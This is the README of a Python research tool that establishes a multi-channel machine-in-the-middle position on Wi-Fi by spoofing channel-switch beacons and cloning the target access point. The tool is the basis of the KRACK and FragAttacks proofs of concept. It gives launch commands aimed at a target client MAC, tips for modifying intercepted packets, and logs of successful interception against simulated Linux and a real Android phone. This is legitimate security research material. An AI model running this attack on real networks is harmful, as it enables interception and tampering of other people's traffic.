# <div align="center">Multi-Channel Machine-in-the-Middle</div>

<a id="intro"></a>
# 1. Introduction

This is a **Python implementation of a Multi-Channel Machine-in-the-Middle (MC-MitM) position**.
Beacons with Channel Switch Announcement (CSA) elements are spoofed to obtain this MitM position.
The goal of this code is to more rapidly proto-type and practically confirm attacks that require
a multi-channel MitM position. In contrast to the [ModWifi MC-MitM code](https://github.com/vanhoefm/modwifi#channel-mitm-and-tkip-broadcast-attack)
this implementation is easier to modify, at the cost of the code being slower due to the usage of Python.

For instance, this code is the basis of the proof-of-concept attacks for the [KRACK](https://krackattacks.com)
and [FragAttacks](https://fragattacks.com) research.

Code history:
* The first implementation of the multi-channel machine-in-the-middle was done in C and only supported Atheros Wi-Fi dongles. See the [ModWifi MC-MitM code](https://github.com/vanhoefm/modwifi#channel-mitm-and-tkip-broadcast-attack).
* A first Python version of the mc-mitm was used in the [KRACK all-zero key proof-of-concept](https://github.com/vanhoefm/krackattacks-poc-zerokey) attack against Android and Linux.
* Others [reproduced the KRACK all-zero key PoC and added substantial comments to the Python code](https://github.com/lucascouto/krackattack-all-zero-tk-key). That may be useful to understand the code.
* This is cleaned-up code of the above Python script to make it easier to use as the basis for other attacks.

<a id="id-prerequisites"></a>
# 2. Prerequisites

The test tool was tested on Ubuntu 22.04. To install the required dependencies, execute:

	# Ubuntu:
	sudo apt-get update
	sudo apt-get install libnl-3-dev libnl-genl-3-dev libnl-route-3-dev libssl-dev \
		libdbus-1-dev git pkg-config build-essential macchanger net-tools virtualenv \
		rfkill hostapd

Then clone this repository **and its submodules**:

	git clone https://github.com/vanhoefm/mc-mitm.git --recursive
	cd mc-mitm

Now build the tools and configure a virtual python3 environment:

	# Build modified Hostapd
	cd research
	./build.sh

	# Configure python environment
	./pysetup.sh

The above instructions only have to be executed once. After pulling in new code assure that
any submodules are updated be executing `git submodule update`. Remember to also recompile
the modified Hostapd after pulling in new code.


<a id="launch-attack"></a>
# 3. Launching the attack

The attack **requires two wireless network cards** and you must be within radio distance of both
the client and the AP. The most reliable network card is one based on [`ath9k_htc`](https://wikidevi.wi-cat.ru/Ath9k_htc).
An example is a [Technoethical N150 HGA](https://tehnoetic.com/tet-n150hga). You can also use
`mac80211_hwsim` on Linux to use this script with simulated interfaces.


## 3.1. Starting the Machine-in-the-Middle

Every time you want to use the test tool, you first have to load the virtual python environment
as root. This can be done using:

	cd research
	sudo su
	source venv/bin/activate

You should now disable Wi-Fi in your network manager so it will not interfere with the test tool.
You can then start the attack tool by executing:

	./mc-mitm.py wlan1 wlan2 testnetwork --target 00:11:11:11:11:11 --continuous-csa

The parameters are as follows:

- `wlan1`: this is the wireless network card that will listen to traffic on the channel of the target (real) AP.

- `wlan2`: this is the wireless network card that will advertise a rogue clone of the target AP on a different channel.

- `testnetwork`: this is the SSID of the Wi-Fi network we are targetting.

- `--target`: this parameter can be used to target a single client. This is strongly recommended because
  targeting only one client drastically improves the reliability of the attack.

- `--continuous-csa`: this means beacons with CSA elements will be continuously spoofed in the channel
  containing the real AP. This improves the change that any target client will move to the rogue channel.

You can execute the script before or after the targeted client connects to the network. If you want
to intercept or target the connection process you have to start the script first and then connect
with the target client to the network. Otherwise, when targeting data frames, you can first start the
client and afterwards start the script. The script will output **"Established MitM position against client"**
in green when the machine-in-the-middle position has been successfully established.

Optional arguments:

- `--debug`: output extra debugging information.


## 3.2. Example with simulated interfaces

You can try out the script, and confirm that basic functionality works, by running the
script in a simualted test environment (e.g., in a virtual machine). This is done by
using simualted Linux Wi-Fi interface. Enable these simulated interfaces as follows:

	modprobe mac80211_hwsim radios=4

Now run the example target (real) AP that we will attack:

	# We use the unmodified hostapd instance of the operating system
	cd mc-mitm
	sudo hostapd hostapd/hostapd_example.conf

Let's now start the machine-in-the-middle script that will wait for a victim to connect:

	cd mc-mitm/research
	sudo su
	source venv/bin/activate
	./mc-mitm.py wlan2 wlan3 testnetwork --target 02:00:00:00:01:00 --continuous-csa --tid

Notice that in this example we will target a specific client MAC address. Targeting
a specific test client improves the reliability of the attack (frames will be acknowleged
and not needlessly retransmitted). Now start the victim client:

	cd mc-mitm
	sudo wpa_supplicant -D nl80211 -i wlan1 -c wpa_supplicant/client_example.conf

The script should now established a MitM between the client and AP. See [example output](#example)
for the expected output of the script.


<a id="notes"></a>
# 4. Experimental notes

To experiment with the attack in practice, with real Wi-Fi dongles, I have found it useful to:

- Put the target network on channel 1 or 11. The rogue AP will be put on a "far away" channel, reducing
  possible cross-channel interference in the multi-channel MitM.

- Configure the target network to use an older network mode such as 802.11b. This assures we can more
  reliably capture all frames sent by the AP.


<a id="development"></a>
# 5. Development notes

- You can extend the functions `should_forward` and `modify_packet` to perform attacks once a MC-MitM has
  been established. These functions control whether packets are forwarded and/or modified, respectively.

- When targeting security configurations that different from a usual WPA2 configs, you will likely have
  to update the code in `NetworkConfig` that parses a beacon to generate a hostapd config that results
  in a beacon with the same RSNE element.

  An alternative might be to modify Hostapd functions such as `ieee802_11_build_ap_params` and
  `hostapd_gen_probe_resp` and directly write the desired beacon and probe response content to the buffer.
  And it seems that beacon parameters can change while the AP is already running, see calls to
  `ieee802_11_update_beacons` from the control interface.

- See the [KRACK all-zero key PoC](https://github.com/vanhoefm/krackattacks-poc-zerokey/blob/research/krackattack/krack-all-zero-tk.py)
  for an example MitM attack using largely similar code.

- Read the [design discussion](research/mc-mitm.py#L8) to understand _why_ the interfaces are configured
  in the way they are. The main difficulty is assuring that frame acknowledgement and retransmission works
  reliably. This works best when targeting a single client.

- All changes to `hostap` are guarded by `ATTACK_MC_MITM` ifdefs.

- Against Linux, the association response is often sent too slow when a MC-MitM has already been established.
  This means a victim Linux client will fail to connect. As a workaround, you can start the script after the
  Linux client has connected (in case your attack doesn't target the handshake). An alternative solution
  would be to let the Hostapd instance in the background send the association response for us, instead of
  waiting for the one from the real AP. But that's not implemented.
  Or use the [ModWifi C implementation](https://github.com/vanhoefm/modwifi#channel-mitm-and-tkip-broadcast-attack),
  but that's harder to modify.

- Against Android, the MC-MitM could be established while the client is connecting and while the client was
  already connected. In other words, the tested Android device (Pixel 4 XL) was not affected by the above
  time constraints of Linux.


<a id="example"></a>
# 6. Example output

## Against simulated Linux interfaces (Aug 27, 2022)

Notice that the `--debug` parameter is used to increase debug output:

	(venv) root@mathy-VirtualBox:/home/mathy/mc-mitm/research# ./mc-mitm.py wlan2 wlan3 testnetwork --target 02:00:00:00:01:00 --continuous-csa --debug
	[13:32:52] Note: remember to disable Wi-Fi in your network manager so it doesn't interfere with this script
	[13:32:52] Note: keep >1 meter between interfaces. Else packet delivery is unreliable & target may disconnect
	[13:32:53] Monitor mode: using wlan2 on real channel and wlan3mon on rogue channel.
	[13:32:53] Target network 02:00:00:00:00:00 detected on channel 1
	[13:32:53] Will use wlan3 to create rogue AP on channel 11
	[13:32:53] Setting MAC address of wlan3 to 02:00:00:00:00:00
	[13:32:53] Attaching filter to wlan2: (wlan type data or wlan type mgt) and ((wlan addr1 02:00:00:00:00:00) or (wlan addr2 02:00:00:00:00:00) or (wlan addr1 02:00:00:00:01:00) or (wlan addr2 02:00:00:00:01:00))
	[13:32:53] Attaching filter to wlan3mon: (wlan type data or wlan type mgt) and ((wlan addr1 02:00:00:00:00:00) or (wlan addr2 02:00:00:00:00:00) or (wlan addr1 02:00:00:00:01:00) or (wlan addr2 02:00:00:00:01:00))
	[13:32:53] Giving the rogue hostapd one second to initialize ...
	[13:32:54] Injected 4 CSA beacon pairs (moving stations to channel 11)
	[13:33:00] Real channel : 02:00:00:00:01:00 -> ff:ff:ff:ff:ff:ff: ProbeReq(seq=398)
	[13:33:00] Real channel : 02:00:00:00:00:00 -> 02:00:00:00:01:00: ProbeResp(seq=39)
	[13:33:00] Rogue channel: 02:00:00:00:01:00 -> ff:ff:ff:ff:ff:ff: ProbeReq(seq=408)
	[13:33:03] Rogue channel: 02:00:00:00:01:00 -> 02:00:00:00:00:00: Auth(seq=409, status=0) -- MitM'ing
		   Client 02:00:00:00:01:00 moved to state GotMitm
		   Established MitM position against client 02:00:00:00:01:00
		   Sending fake auth to rouge AP to register client
	[13:33:03] Sent frame to hostapd: Auth(seq=0, status=0)
	[13:33:03] Real channel : 02:00:00:00:00:00 -> 02:00:00:00:01:00: Auth(seq=40, status=0) -- MitM'ing
	[13:33:03] Rogue channel: 02:00:00:00:01:00 -> 02:00:00:00:00:00: AssoReq(seq=410) -- MitM'ing
	[13:33:03] Sent frame to hostapd: AssoReq(seq=410)
	[13:33:03] Real channel : 02:00:00:00:00:00 -> 02:00:00:00:01:00: AssoResp(seq=41, status=0) -- MitM'ing
	[13:33:03] Real channel : 02:00:00:00:00:00 -> 02:00:00:00:01:00: EAPOL-Msg1(seq=0, replay=1) -- MitM'ing
	[13:33:03] Rogue channel: 02:00:00:00:01:00 -> 02:00:00:00:00:00: EAPOL-Msg2(seq=0, replay=1) -- MitM'ing
	[13:33:04] Real channel : 02:00:00:00:00:00 -> 02:00:00:00:01:00: EAPOL-Msg3(seq=1, replay=2) -- MitM'ing
	[13:33:04] Rogue channel: 02:00:00:00:01:00 -> 02:00:00:00:00:00: EAPOL-Msg4(seq=1, replay=2) -- MitM'ing
	[13:33:04] Rogue hostapd: nl80211: sta_remove -> DEL_STATION wlan3 02:00:00:00:01:00 --> -2 (No such file or directory)
	[13:33:04] Rogue hostapd: nl80211: Add STA 02:00:00:00:01:00
	[13:33:04] Rogue hostapd: send_auth_reply: not sending own authentication reply
	[13:33:04] Rogue hostapd: send_auth_reply: not sending own authentication reply
	[13:33:04] Rogue hostapd: send_assoc_resp: not sending association reply (status=0)
	[13:33:04] Rogue hostapd: __wpa_send_eapol: not sending EAPOL frame
	[13:33:04] Rogue hostapd: nl80211: sta_remove -> DEL_STATION wlan3 02:00:00:00:01:00 --> 0 (Success)
	[13:33:04] Rogue hostapd: nl80211: Add STA 02:00:00:00:01:00
	[13:33:04] Rogue hostapd: send_assoc_resp: not sending association reply (status=0)
	[13:33:04] Rogue hostapd: __wpa_send_eapol: not sending EAPOL frame
	[13:33:04] Rogue hostapd: wpa_receive: Igning all EAPOL frames


## Against Android device (May 8, 2022)

	(venv) [root@zbook-mathy research]# ./mc-mitm.py wlp0s20f0u1 wlp0s20f3 testnetwork --debug -t 00:11:11:11:11:11 --strict-echo-test --continuous-csa
	[01:34:44] Note: remember to disable Wi-Fi in your network manager so it doesn't interfere with this script
	[01:34:44] Note: keep >1 meter between interfaces. Else packet delivery is unreliable & target may disconnect
	[01:34:45] Monitor mode: using wlp0s20f0u1 on real channel and wlp0s20f3mon on rogue channel.
	[01:34:45] Target network 00:22:22:22:22:22 detected on channel 1
	[01:34:45] Will use wlp0s20f3 to create rogue AP on channel 11
	[01:34:45] Setting MAC address of wlp0s20f3 to 00:22:22:22:22:22
	[01:34:45] Attaching filter to wlp0s20f0u1: (wlan type data or wlan type mgt) and ((wlan addr1 00:22:22:22:22:22) or (wlan addr2 00:22:22:22:22:22) or (wlan addr1 00:11:11:11:11:11) or (wlan addr2 00:11:11:11:11:11))
	[01:34:45] Attaching filter to wlp0s20f3mon: (wlan type data or wlan type mgt) and ((wlan addr1 00:22:22:22:22:22) or (wlan addr2 00:22:22:22:22:22) or (wlan addr1 00:11:11:11:11:11) or (wlan addr2 00:11:11:11:11:11))
	[01:34:45] Giving the rogue hostapd one second to initialize ...
	[01:34:46] Injected 4 CSA beacon pairs (moving stations to channel 11)
	[01:34:54] Rogue channel: 00:11:11:11:11:11 -> 00:22:22:22:22:22: ProbeReq(seq=2052)
	[01:34:54] Rogue channel: 00:22:22:22:22:22 -> 00:11:11:11:11:11: ProbeResp(seq=128)
	[01:34:54] Rogue channel: 00:11:11:11:11:11 -> 00:22:22:22:22:22: Auth(seq=2053, status=0) -- MitM'ing
		   Client 00:11:11:11:11:11 moved to state 2
		   Established MitM position against client 00:11:11:11:11:11
		   Sending fake auth to rouge AP to register client
	[01:34:54] Sent frame to hostapd: Auth(seq=0, status=0)
	[01:34:54] Rogue hostapd: nl80211: sta_remove -> DEL_STATION wlp0s20f3 00:11:11:11:11:11 --> -2 (No such file or directory)
	[01:34:54] Rogue hostapd: nl80211: Add STA 00:11:11:11:11:11
	[01:34:54] Rogue hostapd: send_auth_reply: not sending own authentication reply
	[01:34:54] Real channel : 00:22:22:22:22:22 -> 00:11:11:11:11:11: Auth(seq=2732, status=0) -- MitM'ing
	[01:34:54] Rogue channel: 00:11:11:11:11:11 -> 00:22:22:22:22:22: AssoReq(seq=2054) -- MitM'ing
	[01:34:54] Sent frame to hostapd: AssoReq(seq=2054)
	[01:34:54] Real channel : 00:22:22:22:22:22 -> 00:11:11:11:11:11: AssoResp(seq=2736, status=0) -- MitM'ing
	[01:34:54] Real channel : 00:22:22:22:22:22 -> 00:11:11:11:11:11: EAPOL-Msg1(seq=0, replay=1) -- MitM'ing
	[01:34:54] Rogue hostapd: send_auth_reply: not sending own authentication reply
	[01:34:54] Rogue hostapd: send_assoc_resp: not sending association reply (status=0)
	[01:34:54] Rogue hostapd: __wpa_send_eapol: not sending EAPOL frame
	[01:34:54] Rogue hostapd: nl80211: sta_remove -> DEL_STATION wlp0s20f3 00:11:11:11:11:11 --> 0 (Success)
	[01:34:54] Rogue hostapd: nl80211: Add STA 00:11:11:11:11:11
	[01:34:54] Rogue channel: 00:11:11:11:11:11 -> 00:22:22:22:22:22: EAPOL-Msg2(seq=0, replay=1) -- MitM'ing
	[01:34:54] Rogue hostapd: send_assoc_resp: not sending association reply (status=0)
	[01:34:54] Rogue hostapd: __wpa_send_eapol: not sending EAPOL frame
	[01:34:54] Real channel : 00:22:22:22:22:22 -> 00:11:11:11:11:11: EAPOL-Msg3(seq=1, replay=2) -- MitM'ing
	[01:34:54] Rogue channel: 00:11:11:11:11:11 -> 00:22:22:22:22:22: EAPOL-Msg4(seq=1, replay=2) -- MitM'ing
	[01:34:54] Rogue hostapd: wpa_receive: Igning all EAPOL frames
	[01:34:54] Rogue channel: 00:11:11:11:11:11 -> 00:22:22:22:22:22: EncData(PN=1, len=246) -- MitM'ing
	[01:34:54] Rogue channel: 00:11:11:11:11:11 -> 00:22:22:22:22:22: EncData(PN=2, len=380) -- MitM'ing
	[01:34:55] Rogue channel: 00:11:11:11:11:11 -> 00:22:22:22:22:22: EncData(PN=3, len=122) -- MitM'ing
	[01:34:55] Rogue channel: 00:11:11:11:11:11 -> 00:22:22:22:22:22: EncData(PN=4, len=246) -- MitM'ing
	[01:34:55] Rogue channel: 00:11:11:11:11:11 -> 00:22:22:22:22:22: EncData(PN=5, len=380) -- MitM'ing
	[01:34:55] Rogue channel: 00:11:11:11:11:11 -> 00:22:22:22:22:22: EncData(PN=6, len=186) -- MitM'ing
	[01:34:55] Rogue channel: 00:11:11:11:11:11 -> 00:22:22:22:22:22: EncData(PN=7, len=106) -- MitM'ing
	[01:34:55] Rogue channel: 00:11:11:11:11:11 -> 00:22:22:22:22:22: EncData(PN=8, len=126) -- MitM'ing
	[01:34:56] Rogue channel: 00:11:11:11:11:11 -> 00:22:22:22:22:22: EncData(PN=9, len=186) -- MitM'ing
	[01:34:56] Rogue channel: 00:11:11:11:11:11 -> 00:22:22:22:22:22: EncData(PN=10, len=126) -- MitM'ing
	[01:34:57] Real channel : 00:22:22:22:22:22 -> 00:11:11:11:11:11: EncData(PN=1, len=378) -- MitM'ing
	[01:34:57] Rogue channel: 00:11:11:11:11:11 -> 00:22:22:22:22:22: EncData(PN=11, len=390) -- MitM'ing
	[01:34:57] Real channel : 00:22:22:22:22:22 -> 00:11:11:11:11:11: EncData(PN=2, len=378) -- MitM'ing
	[01:34:57] Rogue channel: 00:11:11:11:11:11 -> 00:22:22:22:22:22: EncData(PN=12, len=78) -- MitM'ing
	[01:34:57] Real channel : 00:22:22:22:22:22 -> 00:11:11:11:11:11: EncData(PN=3, len=78) -- MitM'ing
	[01:34:57] Rogue channel: 00:11:11:11:11:11 -> 00:22:22:22:22:22: EncData(PN=13, len=114) -- MitM'ing
	[01:34:57] Real channel : 00:22:22:22:22:22 -> 00:11:11:11:11:11: EncData(PN=4, len=90) -- MitM'ing
	[01:34:57] Rogue channel: 00:11:11:11:11:11 -> 00:22:22:22:22:22: EncData(PN=14, len=110) -- MitM'ing
	[01:34:57] Rogue channel: 00:11:11:11:11:11 -> 00:22:22:22:22:22: EncData(PN=15, len=125) -- MitM'ing
	[01:34:57] Real channel : 00:22:22:22:22:22 -> 00:11:11:11:11:11: EncData(PN=5, len=141) -- MitM'ing

